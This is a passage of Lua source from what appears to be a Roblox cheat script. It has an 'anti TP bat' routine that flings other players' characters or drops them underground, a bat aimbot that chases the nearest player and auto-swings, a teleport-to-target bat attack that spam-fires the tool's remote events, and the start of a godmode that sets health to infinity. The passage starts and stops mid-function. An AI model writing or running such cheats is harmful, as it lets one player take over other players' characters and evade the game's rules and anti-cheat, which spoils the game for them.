                for _, t in ipairs(bp:GetChildren()) do
                    if t:IsA("Tool") and string.find(string.lower(t.Name), "bat", 1, true) then
                        pcall(function() hum:EquipTool(t) end)
                        bat = t
                        break
                    end
                end
            end
        end
        if not bat then return end
        if targetRoot and targetRoot.Parent then
            -- keep OUR position locked; only face them, don't teleport into them
            local lock = M._aadLastGoodCF and M._aadLastGoodCF.Position or myRoot.Position
            myRoot.CFrame = CFrame.new(lock, Vector3.new(targetRoot.Position.X, lock.Y, targetRoot.Position.Z))
        end
        for _ = 1, 6 do
            pcall(function() bat:Activate() end)
            for _, d in ipairs(bat:GetDescendants()) do
                if d:IsA("RemoteEvent") then pcall(function() d:FireServer() end) end
                if d:IsA("RemoteFunction") then pcall(function() d:InvokeServer() end) end
            end
        end
    end)
end

-- Simple Anti Anti Desync (pre-protect version): soft counter only, no hard TP-bat shield
function M.startAntiAntiDesync()
    M.stopAntiAntiDesync()
    M.aadEnabled = true
    M._aadPrevPos = {}
    M._aadLastHit = {}
    M._aadUnderAttackUntil = 0
    M._aadFocusEnemy = nil

    M.aadConn = RunService.Heartbeat:Connect(function()
        if not M.aadEnabled then return end
        local char = player.Character
        if not char then return end
        local myRoot = char:FindFirstChild("HumanoidRootPart")
        local myHum = char:FindFirstChildOfClass("Humanoid")
        if not myRoot or not myHum then return end

        local now = tick()
        if myRoot.Position.Y > 2 and myRoot.Position.Y < 400 then
            M._aadLastGoodCF = myRoot.CFrame
        end

        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player and plr.Character then
                local eRoot = plr.Character:FindFirstChild("HumanoidRootPart")
                local eHum = plr.Character:FindFirstChildOfClass("Humanoid")
                if eRoot and eHum and eHum.Health > 0 then
                    local pos = eRoot.Position
                    local prev = M._aadPrevPos[plr.UserId]
                    M._aadPrevPos[plr.UserId] = pos
                    if prev then
                        local jumped = (pos - prev).Magnitude
                        local distToMe = (pos - myRoot.Position).Magnitude
                        local isTpBat = jumped >= 12 and distToMe <= 10
                        local clinging = distToMe <= 6 and jumped >= 4
                        if isTpBat or clinging then
                            local last = M._aadLastHit[plr.UserId] or 0
                            if now - last >= 0.15 then
                                M._aadLastHit[plr.UserId] = now
                                M._aadFocusEnemy = plr
                                -- soft counter only (original style)
                                pcall(function()
                                    local away = (eRoot.Position - myRoot.Position)
                                    if away.Magnitude < 0.1 then away = Vector3.new(1, 0, 0) end
                                    away = away.Unit
                                    if M.aadVersion == "V2" then
                                        eRoot.CFrame = CFrame.new(eRoot.Position.X, -200, eRoot.Position.Z)
                                        eRoot.AssemblyLinearVelocity = Vector3.new(0, -200, 0)
                                    else
                                        eRoot.CFrame = CFrame.new(myRoot.Position + away * 16 + Vector3.new(0, 4, 0))
                                        eRoot.AssemblyLinearVelocity = away * 80 + Vector3.new(0, 30, 0)
                                    end
                                end)
                            end
                        end
                    end
                end
            end
        end
    end)

    if M.aadRenderConn then pcall(function() M.aadRenderConn:Disconnect() end); M.aadRenderConn = nil end
    if M._aadRefreshVisual then pcall(M._aadRefreshVisual) end
    if M.setAadToggleVisual then pcall(function() M.setAadToggleVisual(true) end) end
end

function M.stopAntiAntiDesync()
    M.aadEnabled = false
    M._aadUnderAttackUntil = 0
    M._aadFocusEnemy = nil
    if M.aadConn then
        pcall(function() M.aadConn:Disconnect() end)
        M.aadConn = nil
    end
    if M.aadRenderConn then
        pcall(function() M.aadRenderConn:Disconnect() end)
        M.aadRenderConn = nil
    end
    pcall(function()
        local c = player.Character
        local r = c and c:FindFirstChild("HumanoidRootPart")
        local bp = r and r:FindFirstChild("VynxAadHold")
        if bp then bp:Destroy() end
    end)
    M._aadPrevPos = {}
    M._aadLastHit = {}
    if M._aadRefreshVisual then pcall(M._aadRefreshVisual) end
    if M.setAadToggleVisual then pcall(function() M.setAadToggleVisual(false) end) end
end

function M.setAntiAntiDesync(on)
    if on then
        M.startAntiAntiDesync()
    else
        M.stopAntiAntiDesync()
    end
    pcall(function() if saveCherryConfig then saveCherryConfig() end end)
end

function M.toggleAntiAntiDesync()
    M.setAntiAntiDesync(not M.aadEnabled)
end

function M.buildAntiAntiDesyncUI()
    if M.aadGui and M.aadGui.Parent then
        pcall(function() M.aadGui:Destroy() end)
    end
    M.aadGui = nil
    M.aadMain = nil

    local WHITE = Color3.fromRGB(255, 255, 255)
    local BLACK = Color3.fromRGB(0, 0, 0)
    local GREY = Color3.fromRGB(40, 40, 40)
    local GREY2 = Color3.fromRGB(28, 28, 28)
    local GREY3 = Color3.fromRGB(120, 120, 120)

    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxAntiAntiDesyncGui"
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 19
    gui.IgnoreGuiInset = true
    local okParent = false
    if gethui then okParent = pcall(function() gui.Parent = gethui() end) end
    if not okParent then
        pcall(function() gui.Parent = player:WaitForChild("PlayerGui") end)
    end
    M.aadGui = gui

    local MAIN_W, MAIN_H = 300, 150
    local main = Instance.new("Frame")
    main.Name = "VynxAadMain"
    main.Size = UDim2.new(0, MAIN_W, 0, MAIN_H)
    main.Position = _unpackUDim2(M.aadPanelPos, UDim2.new(0.5, -MAIN_W/2, 0.4, 0))
    main.BackgroundColor3 = BLACK
    main.BackgroundTransparency = 0.05
    main.BorderSizePixel = 0
    main.Active = true
    main.ClipsDescendants = true
    main.Visible = M.aadPanelOpen == true
    main.Parent = gui
    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 16)
    local mainStroke = Instance.new("UIStroke", main)
    mainStroke.Color = WHITE
    mainStroke.Thickness = 1.2
    mainStroke.Transparency = 0.55
    M.aadMain = main
    pcall(function() M.applyPanelBackground(main, UDim.new(0, 16)) end)

    -- drag + save position
    do
        local dragging, dragStart, startPos
        main.InputBegan:Connect(function(i)
            if M.aadLocked then return end
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                dragging = true; dragStart = i.Position; startPos = main.Position
                i.Changed:Connect(function()
                    if i.UserInputState == Enum.UserInputState.End then
                        dragging = false
                        M.aadPanelPos = _packUDim2(main.Position)
                        pcall(function() if saveCherryConfig then saveCherryConfig() end end)
                    end
                end)
            end
        end)
        UIS.InputChanged:Connect(function(i)
            if M.aadLocked then dragging = false; return end
            if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
                local d = i.Position - dragStart
                main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
            end
        end)
    end

    -- white accent bar
    local accentBar = Instance.new("Frame", main)
    accentBar.Size = UDim2.new(0, 3, 0, 16)
    accentBar.Position = UDim2.new(0, 12, 0, 14)
    accentBar.BackgroundColor3 = WHITE
    accentBar.BorderSizePixel = 0
    accentBar.ZIndex = 5
    Instance.new("UICorner", accentBar).CornerRadius = UDim.new(1, 0)

    local title = Instance.new("TextLabel", main)
    title.Size = UDim2.new(0, 160, 0, 20)
    title.Position = UDim2.new(0, 20, 0, 12)
    title.BackgroundTransparency = 1
    title.Text = "XIM ANTI TP BAT"
    title.TextColor3 = WHITE
    title.Font = Enum.Font.GothamBold
    title.TextSize = 12
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.ZIndex = 5

    local function mkIconBtn(xOff, txt, w)
        local b = Instance.new("TextButton", main)
        b.Size = UDim2.new(0, w or 28, 0, 26)
        b.Position = UDim2.new(1, xOff, 0, 10)
        b.BackgroundColor3 = GREY2
        b.BackgroundTransparency = 0
        b.BorderSizePixel = 0
        b.Text = txt
        b.TextColor3 = WHITE
        b.Font = Enum.Font.GothamBold
        b.TextSize = 11
        b.AutoButtonColor = false
        b.ZIndex = 6
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
        local st = Instance.new("UIStroke", b)
        st.Color = WHITE
        st.Thickness = 1
        st.Transparency = 0.7
        return b
    end

    local closeBtn = mkIconBtn(-36, "-", 28)
    closeBtn.MouseButton1Click:Connect(function()
        M.setAadPanelOpen(false)
    end)

    local verLabel = mkIconBtn(-72, (M.aadVersion == "V1") and "v1" or "v2", 32)
    local nextBtn = mkIconBtn(-104, ">", 26)
    local prevBtn = mkIconBtn(-134, "<", 26)
    local setBtn = mkIconBtn(-168, "SET", 30)
    setBtn.TextSize = 9

    local function refreshVersion()
        verLabel.Text = (M.aadVersion == "V1") and "v1" or "v2"
    end
    local function cycleVersion(dir)
        if dir > 0 then
            M.aadVersion = (M.aadVersion == "V1") and "V2" or "V1"
        else
            M.aadVersion = (M.aadVersion == "V2") and "V1" or "V2"
        end
        refreshVersion()
        pcall(function() if saveCherryConfig then saveCherryConfig() end end)
    end
    nextBtn.MouseButton1Click:Connect(function() cycleVersion(1) end)
    prevBtn.MouseButton1Click:Connect(function() cycleVersion(-1) end)
    verLabel.MouseButton1Click:Connect(function() cycleVersion(1) end)

    setBtn.MouseButton1Click:Connect(function()
        M.aadLocked = not M.aadLocked
        setBtn.Text = M.aadLocked and "LOCK" or "SET"
        setBtn.BackgroundColor3 = M.aadLocked and WHITE or GREY2
        setBtn.TextColor3 = M.aadLocked and BLACK or WHITE
        pcall(function() if saveCherryConfig then saveCherryConfig() end end)
    end)
    if M.aadLocked then
        setBtn.Text = "LOCK"
        setBtn.BackgroundColor3 = WHITE
        setBtn.TextColor3 = BLACK
    end

    -- ACTIVATE button (B&W)
    local actBtn = Instance.new("TextButton", main)
    actBtn.Name = "ActivateBtn"
    actBtn.Size = UDim2.new(1, -24, 0, 40)
    actBtn.Position = UDim2.new(0, 12, 0, 48)
    actBtn.BackgroundColor3 = GREY2
    actBtn.BackgroundTransparency = 0
    actBtn.BorderSizePixel = 0
    actBtn.Text = M.aadEnabled and "ACTIVE" or "ACTIVATE"
    actBtn.TextColor3 = WHITE
    actBtn.Font = Enum.Font.GothamBold
    actBtn.TextSize = 15
    actBtn.AutoButtonColor = false
    actBtn.ZIndex = 5
    Instance.new("UICorner", actBtn).CornerRadius = UDim.new(0, 10)
    local actStroke = Instance.new("UIStroke", actBtn)
    actStroke.Color = WHITE
    actStroke.Thickness = 1
    actStroke.Transparency = 0.55

    local function refreshToggle()
        local on = M.aadEnabled == true
        actBtn.Text = on and "ACTIVE" or "ACTIVATE"
        actBtn.TextColor3 = on and BLACK or WHITE
        actBtn.BackgroundColor3 = on and WHITE or GREY2
        actStroke.Color = WHITE
        actStroke.Transparency = on and 0.15 or 0.55
        mainStroke.Transparency = on and 0.3 or 0.55
    end
    M._aadRefreshVisual = refreshToggle
    M.setAadToggleVisual = function() refreshToggle() end

    actBtn.MouseButton1Click:Connect(function()
        M.toggleAntiAntiDesync()
        refreshToggle()
    end)

    local kbLbl = Instance.new("TextLabel", main)
    kbLbl.Size = UDim2.new(0, 80, 0, 28)
    kbLbl.Position = UDim2.new(0, 16, 1, -40)
    kbLbl.BackgroundTransparency = 1
    kbLbl.Text = "KEYBIND"
    kbLbl.TextColor3 = GREY3
    kbLbl.Font = Enum.Font.GothamBold
    kbLbl.TextSize = 11
    kbLbl.TextXAlignment = Enum.TextXAlignment.Left
    kbLbl.ZIndex = 5

    local keyBtn = Instance.new("TextButton", main)
    keyBtn.Size = UDim2.new(0, 48, 0, 28)
    keyBtn.Position = UDim2.new(1, -60, 1, -40)
    keyBtn.BackgroundColor3 = GREY2
    keyBtn.BorderSizePixel = 0
    local kbName = tostring(M.aadKeybind or "Z")
    if kbName == "Three" then kbName = "3" end
    keyBtn.Text = kbName
    keyBtn.TextColor3 = WHITE
    keyBtn.Font = Enum.Font.GothamBold
    keyBtn.TextSize = 12
    keyBtn.AutoButtonColor = false
    keyBtn.ZIndex = 6
    Instance.new("UICorner", keyBtn).CornerRadius = UDim.new(0, 8)
    local keyStroke = Instance.new("UIStroke", keyBtn)
    keyStroke.Color = WHITE
    keyStroke.Thickness = 1
    keyStroke.Transparency = 0.65

    local listening = false
    keyBtn.MouseButton1Click:Connect(function()
        if listening then return end
        listening = true
        keyBtn.Text = "..."
        local conn
        conn = UIS.InputBegan:Connect(function(inp, gpe)
            if gpe then return end
            if inp.UserInputType == Enum.UserInputType.Keyboard then
                M.aadKeybind = inp.KeyCode.Name
                local show = M.aadKeybind
                if show == "Three" then show = "3" end
                keyBtn.Text = show
                listening = false
                pcall(function() conn:Disconnect() end)
                pcall(function() if saveCherryConfig then saveCherryConfig() end end)
            end
        end)
    end)

    refreshToggle()
    refreshVersion()
end

function M.setAadPanelOpen(on)
    M.aadPanelOpen = on and true or false
    if M.aadPanelOpen and (not M.aadGui or not M.aadGui.Parent) then
        M.buildAntiAntiDesyncUI()
    end
    if M.aadMain then
        M.aadMain.Visible = M.aadPanelOpen
    end
    if M.setAadPanelVisual then
        pcall(function() M.setAadPanelVisual(M.aadPanelOpen) end)
    end
    pcall(function() if saveCherryConfig then saveCherryConfig() end end)
end

-- keybind listener for AAD toggle
task.spawn(function()
    if M.aadKeyConn then pcall(function() M.aadKeyConn:Disconnect() end) end
    M.aadKeyConn = UIS.InputBegan:Connect(function(inp, gpe)
        if gpe then return end
        if inp.UserInputType ~= Enum.UserInputType.Keyboard then return end
        local name = inp.KeyCode.Name
        if name == tostring(M.aadKeybind or "Three") then
            M.toggleAntiAntiDesync()
        end
    end)
end)

-- ============================================================
-- NORMAL AIMBOT (Vynx logic)
-- ============================================================
M.aimbotSpeed = M.aimbotSpeed or 58
M.laggerAimbotSpeed = M.laggerAimbotSpeed or 40
M._aimbotSwingCooldown = false


M.aimbotSpeed = M.aimbotSpeed or 57
M.laggerAimbotSpeed = M.laggerAimbotSpeed or 40
M.aimbotHitRange = M.aimbotHitRange or 9.5
M.aimbotSwingCD = M.aimbotSwingCD or 0.12
M.aimbotRotationSpeed = M.aimbotRotationSpeed or 0.55
M.aimbotRotationEnabled = true
M.aimbotHeightOffset = M.aimbotHeightOffset or 1.6

function M.findBatForAimbot()
    local char = player.Character
    if not char then return nil end
    local bp = player:FindFirstChild("Backpack")
    -- Prefer exact names from slap list first
    if M.BAT_COUNTER_SLAP_LIST then
        for _, name in ipairs(M.BAT_COUNTER_SLAP_LIST) do
            local t = char:FindFirstChild(name) or (bp and bp:FindFirstChild(name))
            if t and t:IsA("Tool") then return t end
        end
    end
    for _, tool in ipairs(char:GetChildren()) do
        if tool:IsA("Tool") then
            local n = tool.Name:lower()
            if n:find("bat") or n:find("slap") then return tool end
        end
    end
    if bp then
        for _, tool in ipairs(bp:GetChildren()) do
            if tool:IsA("Tool") then
                local n = tool.Name:lower()
                if n:find("bat") or n:find("slap") then return tool end
            end
        end
    end
    return nil
end

function M.getClosestTargetAimbot()
    local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    local closest, minDist = nil, math.huge
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if tRoot and hum and hum.Health > 0 then
                local dist = (tRoot.Position - root.Position).Magnitude
                if dist < minDist then
                    minDist = dist
                    closest = tRoot
                end
            end
        end
    end
    return closest
end

-- Sticky target: hold same enemy ~1.25s
M.AIMBOT_STICKY_TIME = M.AIMBOT_STICKY_TIME or 1.25
M.AIMBOT_STICKY_MAX_DIST = M.AIMBOT_STICKY_MAX_DIST or 85
M._aimbotStickyUntil = 0
M._aimbotStickyTarget = nil

function M.getAutoBatTarget()
    local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    local now = tick()
    local function stillValid(tRoot)
        if not tRoot or not tRoot.Parent then return false end
        local hum = tRoot.Parent:FindFirstChildOfClass("Humanoid")
        if not hum or hum.Health <= 0 then return false end
        if (tRoot.Position - root.Position).Magnitude > (M.AIMBOT_STICKY_MAX_DIST or 85) then return false end
        return true
    end
    local sticky = M._aimbotStickyTarget
    if sticky and now < (M._aimbotStickyUntil or 0) and stillValid(sticky) then
        M._aimbotTarget = sticky
        return sticky
    end
    if now - (M._aimbotLastScan or 0) <= 0.08 and M._aimbotTarget and stillValid(M._aimbotTarget) then
        return M._aimbotTarget
    end
    M._aimbotLastScan = now
    local closest = M.getClosestTargetAimbot and M.getClosestTargetAimbot() or nil
    M._aimbotTarget = closest
    M._aimbotStickyTarget = closest
    M._aimbotStickyUntil = now + (tonumber(M.AIMBOT_STICKY_TIME) or 1.25)
    return closest
end

function M.getNormalAimbotSpeed()
    -- Vynx/S2hub: Lagger modes use lagger aimbot speed, else normal aimbot speed
    if M.laggerModeEnabled or M.laggerCarryActive then
        return tonumber(M.laggerAimbotSpeed) or 40
    end
    return tonumber(M.aimbotSpeed) or 58
end

function M._aimbotSwingBat(char, bat)
    if not bat or not bat.Parent then return end
    if bat.Parent ~= char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then pcall(function() hum:EquipTool(bat) end) end
        return
    end
    pcall(function() bat:Activate() end)
end

function M.startBatAimbot()
    if not M.safeModeTryStart() then return end
    if M.aimbotConn then
        pcall(function() M.aimbotConn:Disconnect() end)
        M.aimbotConn = nil
    end
    pcall(function() RunService:UnbindFromRenderStep("VynxAimbotRotCam") end)

    if M.autoLeftEnabled then
        M.autoLeftEnabled = false
        if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end
        M.stopAutoLeft()
    end
    if M.autoRightEnabled then
        M.autoRightEnabled = false
        if M.autoRightSetVisual then M.autoRightSetVisual(false) end
        M.stopAutoRight()
    end

    M._autoTPWasEnabledForBat = false
    if M.autoTPEnabled then
        M._autoTPWasEnabledForBat = true
        M.stopAutoTP()
        if M.setAutoTPVisual then M.setAutoTPVisual(false) end
    end
    pcall(function()
        if M.stopAutoTPForAction then M.stopAutoTPForAction() end
    end)

    M.autoBatEnabled = true
    M.autoSwingEnabled = true
    M.autoBatEquippedThisRun = false
    pcall(function() M.syncCombatAntiDie() end)
    M._aimbotTarget = nil
    M._aimbotLastScan = 0

    -- SCYTHE VS aimbot: Heartbeat + prediction + angular velocity + sticky
    M.aimbotConn = RunService.Heartbeat:Connect(function()
        if not M.autoBatEnabled then return end
        local char = player.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        -- skip while dead / ragdoll / broken physics (prevents die+fling loop)
        if hum.Health <= 0 then return end
        if hum.PlatformStand then
            pcall(function() hum.PlatformStand = false end)
        end
        pcall(function()
            local lv = root.AssemblyLinearVelocity
            local av = root.AssemblyAngularVelocity
            -- fling recovery: damp insane velocity from hit/death
            if lv.Magnitude > 220 then
                root.AssemblyLinearVelocity = lv.Unit * 60
            end
            if av.Magnitude > 25 then
                root.AssemblyAngularVelocity = Vector3.zero
            end
        end)

        if not char:FindFirstChildOfClass("Tool") then
            local bat = M.findBatForAimbot and M.findBatForAimbot() or nil
            if bat then pcall(function() hum:EquipTool(bat) end) end
        end

        local target = (M.getAutoBatTarget and M.getAutoBatTarget()) or (M.getClosestTargetAimbot and M.getClosestTargetAimbot())
        if not target then
            hum.AutoRotate = true
            root.AssemblyAngularVelocity = Vector3.zero
            return
        end
        M._aimbotTarget = target
        hum.AutoRotate = false

        local targetVel = target.AssemblyLinearVelocity or Vector3.zero
        local myPos = root.Position
        local targetPos = target.Position
        local predictPos = targetPos + targetVel * 0.14 + target.CFrame.LookVector * 0.3
        local direction = predictPos - myPos
        local flatDir = Vector3.new(direction.X, 0, direction.Z)
        if flatDir.Magnitude > 0.01 then flatDir = flatDir.Unit else flatDir = Vector3.new(0, 0, 1) end

        local chaseSpeed = M.getNormalAimbotSpeed and M.getNormalAimbotSpeed() or (tonumber(M.aimbotSpeed) or 58)
        local desiredHeight = targetPos.Y + 3.7
        local yVel = (desiredHeight - myPos.Y) * 19.5 + targetVel.Y * 0.8
        if hum.FloorMaterial ~= Enum.Material.Air then yVel = math.max(yVel, 13) end
        yVel = math.clamp(yVel, -50, 80)
        local desiredVel = Vector3.new(flatDir.X * chaseSpeed, yVel, flatDir.Z * chaseSpeed)
        root.AssemblyLinearVelocity = root.AssemblyLinearVelocity:Lerp(desiredVel, 0.65)

        -- rotate with CFrame (no crazy angular velocity = no self-fling)
        local predictedPos = targetPos + targetVel * math.clamp(targetVel.Magnitude / 150, 0.05, 0.2)
        if (predictedPos - myPos).Magnitude > 0.1 then
            local look = Vector3.new(predictedPos.X, myPos.Y, predictedPos.Z)
            root.CFrame = CFrame.new(myPos, look)
            root.AssemblyAngularVelocity = Vector3.zero
        end

        if M.autoSwingEnabled ~= false then
            local bat = char:FindFirstChild("Bat") or (M.findBatForAimbot and M.findBatForAimbot())
            if bat and bat:IsA("Tool") then pcall(function() bat:Activate() end) end
        end
    end)

    -- keep aimbot ON after death/respawn (do not turn off)
    if M._aimbotCharConn then pcall(function() M._aimbotCharConn:Disconnect() end) end
    M._aimbotCharConn = player.CharacterAdded:Connect(function(char)
        if not M.autoBatEnabled then return end
        task.wait(0.25)
        local root = char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart", 3)
        local hum = char:FindFirstChildOfClass("Humanoid")
        pcall(function()
            if root then
                root.AssemblyLinearVelocity = Vector3.zero
                root.AssemblyAngularVelocity = Vector3.zero
            end
            if hum then
                hum.PlatformStand = false
                hum.AutoRotate = false
                local bat = M.findBatForAimbot and M.findBatForAimbot() or nil
                if bat then hum:EquipTool(bat) end
            end
            if M.syncCombatAntiDie then M.syncCombatAntiDie() end
        end)
        if M.autoBatSetVisual then pcall(function() M.autoBatSetVisual(true) end) end
        if M.mobBtnRefs and M.mobBtnRefs.autoBat then pcall(function() M.mobBtnRefs.autoBat(true) end) end
    end)

    if M.autoBatSetVisual then M.autoBatSetVisual(true) end
    if M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(true) end
end

function M.stopBatAimbot()
    if M.aimbotConn then
        pcall(function() M.aimbotConn:Disconnect() end)
        M.aimbotConn = nil
    end
    if M._aimbotCharConn then
        pcall(function() M._aimbotCharConn:Disconnect() end)
        M._aimbotCharConn = nil
    end
    pcall(function() RunService:UnbindFromRenderStep("VynxAimbotRotCam") end)
    do
        local char = player.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if root then
            pcall(function()
                root.AssemblyLinearVelocity = root.AssemblyLinearVelocity * 0.3
                root.AssemblyAngularVelocity = Vector3.zero
            end)
        end
        if hum then pcall(function() hum.AutoRotate = true end) end
    end
    M._aimbotStickyTarget = nil
    M._aimbotLookPos = nil
    M._aimbotTarget = nil
    M._aimbotSwingCooldown = false
    M._aimbotLastSwing = 0
    M._aimbotTargetLockUntil = 0
    M.autoBatEnabled = false
    M.autoBatEquippedThisRun = false
    pcall(function() M.syncCombatAntiDie() end)

    local char = player.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if root then
        root.AssemblyLinearVelocity = Vector3.zero
        root.AssemblyAngularVelocity = Vector3.zero
    end
    local hum2 = char and char:FindFirstChildOfClass("Humanoid")
    if hum2 then hum2.AutoRotate = true end

    if M._autoTPWasEnabledForBat then
        M._autoTPWasEnabledForBat = false
        M.autoTPEnabled = true
        if M.setAutoTPVisual then M.setAutoTPVisual(true) end
        M.startAutoTP()
    end

    if M.autoBatSetVisual then M.autoBatSetVisual(false) end
    if M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(false) end
end

function M.queueAutoBatStart()
    if not M.safeModeTryStart() then return end
    if M.antiKickEnabled and M.brainrotDetected then return end
    if M.autoLeftEnabled then M.autoLeftEnabled=false; if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end; M.stopAutoLeft() end
    if M.autoRightEnabled then M.autoRightEnabled=false; if M.autoRightSetVisual then M.autoRightSetVisual(false) end; M.stopAutoRight() end
    M.startBatAimbot()
end

function M.swingCurrentBatAimbot(char)
    if not M.autoSwingEnabled then return end
    local bat = M.findBatForAimbot()
    if bat then
        M._aimbotSwingBat(char or player.Character, bat)
    end
end

-- ============================================================
-- BAT TP (Green Duels V2 style – hard CFrame TP + camera + dual swing loops)
-- ============================================================
M._bypassTarget = nil
M._bypassHRP = nil
M._bypassHum = nil
M.tpBatRange = M.tpBatRange or 1e9 -- unlimited: always nearest enemy
M.tpBatClose = M.tpBatClose or 5 -- Green Duels threshold
M.tpBatOffset = M.tpBatOffset or 0
M.tpBatHitMode = M.tpBatHitMode or "Sure" -- "Sure" | "Normal"
M.tpBatSureHitEnabled = true
M._tpBatLastSwing = 0
M._bypassSwingCooldown = false
M._sureHitCD = false
M._normalHitCD = false
M._bypassRenderConn = nil -- Green-style RenderStepped twin

-- Find / equip any bat tool (exact or name contains "bat")
function M._bypassFindBat()
    local char = player.Character
    if not char then return nil end
    local function isBat(t)
        if not t or not t:IsA("Tool") then return false end
        local n = string.lower(t.Name)
        return n == "bat" or n:find("bat", 1, true) ~= nil
    end
    for _, t in ipairs(char:GetChildren()) do
        if isBat(t) then return t end
    end
    local bp = player:FindFirstChild("Backpack")
    if bp then
        for _, t in ipairs(bp:GetChildren()) do
            if isBat(t) then
                pcall(function() t.Parent = char end)
                return t
            end
        end
    end
    return nil
end

-- Sure Hit — auto-swing multi-fire
function M._bypassTryHitBat()
    if M.tpBatAutoSwing == false and M.autoSwingEnabled == false then return end
    if M._sureHitCD then return end
    M._sureHitCD = true
    pcall(function()
        local bat = M._bypassFindBat()
        if bat then
            for _ = 1, 3 do
                pcall(function() bat:Activate() end)
                local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
                if ev then pcall(function() ev:FireServer() end) end
            end
            local rf = bat:FindFirstChildWhichIsA("RemoteFunction")
            if rf then pcall(function() rf:InvokeServer() end) end
        end
    end)
    task.delay(0.045, function() M._sureHitCD = false end)
end

-- Normal Hit — auto-swing multi-fire
function M._bypassTryHitBatNormal()
    if M.tpBatAutoSwing == false and M.autoSwingEnabled == false then return end
    if M._normalHitCD then return end
    M._normalHitCD = true
    pcall(function()
        local bat = M._bypassFindBat()
        if bat then
            for _ = 1, 3 do
                pcall(function() bat:Activate() end)
                local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
                if ev then pcall(function() ev:FireServer() end) end
            end
            local rf = bat:FindFirstChildWhichIsA("RemoteFunction")
            if rf then pcall(function() rf:InvokeServer() end) end
        end
    end)
    task.delay(0.045, function() M._normalHitCD = false end)
end

-- Prefer enemy in camera view / where you aim (shiftlock look), then nearest
function M._bypassGetClosest()
    local root = M._bypassHRP or (player.Character and player.Character:FindFirstChild("HumanoidRootPart"))
    if not root then return nil, math.huge end
    local cam = workspace.CurrentCamera
    local closest, bestScore = nil, math.huge
    local bestDist = math.huge
    local camPos = cam and cam.CFrame.Position or root.Position
    local look = cam and cam.CFrame.LookVector or root.CFrame.LookVector
    local vp = cam and cam.ViewportSize or Vector2.new(1920, 1080)
    local cx, cy = vp.X * 0.5, vp.Y * 0.5
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
            local tHum = plr.Character:FindFirstChildOfClass("Humanoid")
            if tRoot and tHum and tHum.Health > 0 then
                local dist = (root.Position - tRoot.Position).Magnitude
                local score = dist
                if cam then
                    local screen, onScreen = cam:WorldToViewportPoint(tRoot.Position)
                    if onScreen and screen.Z > 0 then
                        local sd = (Vector2.new(screen.X, screen.Y) - Vector2.new(cx, cy)).Magnitude
                        -- Prefer who you are looking at (center of screen)
                        score = sd * 0.85 + dist * 0.25
                    else
                        local toT = (tRoot.Position - camPos)
                        if toT.Magnitude > 0.1 then
                            local dot = look:Dot(toT.Unit)
                            if dot > 0.15 then
                                score = dist * (1.6 - math.clamp(dot, 0, 1))
                            else
                                score = dist * 3.5 -- behind camera = low priority
                            end
                        end
                    end
                end
                if score < bestScore then
                    bestScore = score
                    bestDist = dist
                    closest = plr
                end
            end
        end
    end
    return closest, bestDist
end

-- Flat look from camera (shiftlock-aware) for placement
function M._bypassCamLookFlat()
    local cam = workspace.CurrentCamera
    local root = M._bypassHRP
    local look
    if cam then
        look = cam.CFrame.LookVector
    elseif root then
        look = root.CFrame.LookVector
    else
        look = Vector3.new(0, 0, -1)
    end
    look = Vector3.new(look.X, 0, look.Z)
    if look.Magnitude < 0.05 then
        look = Vector3.new(0, 0, -1)
    else
        look = look.Unit
    end
    return look
end

-- Smooth body face + place near target along camera direction (does NOT lock camera)
function M._bypassSmoothToTarget(tr)
    local hrp = M._bypassHRP
    if not hrp or not tr then return end
    local look = M._bypassCamLookFlat()
    local tVel = tr.AssemblyLinearVelocity or Vector3.zero
    -- light prediction
    local pred = tr.Position + Vector3.new(tVel.X, 0, tVel.Z) * 0.08
    -- stand slightly in front of target relative to where YOU are looking
    local standDist = 2.0
    local standPos = pred - look * standDist + Vector3.new(0, 0.55, 0)
    local faceAt = Vector3.new(pred.X, standPos.Y, pred.Z)
    local goal = CFrame.lookAt(standPos, faceAt)
    -- smooth lerp (more success, less jitter)
    local alpha = 0.62
    hrp.CFrame = hrp.CFrame:Lerp(goal, alpha)
    -- kill sideways drift
    local v = hrp.AssemblyLinearVelocity
    hrp.AssemblyLinearVelocity = Vector3.new(v.X * 0.35, v.Y, v.Z * 0.35)
end


-- ============================================================
-- ANTI-BYPASS GODMODE (immune while bypass aimbot is on)
-- ============================================================
function M._bypassClearGodConns()
    for _, key in ipairs({"_bypassGodConn", "_bypassGodHealthConn", "_bypassGodDiedConn", "_bypassGodCharConn", "_bypassGodStateConn"}) do
        local c = M[key]
        if c then pcall(function() c:Disconnect() end); M[key] = nil end
    end
end

function M._bypassProtectCharacter(char)
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    pcall(function()
        hum.MaxHealth = math.huge
        hum.Health = math.huge
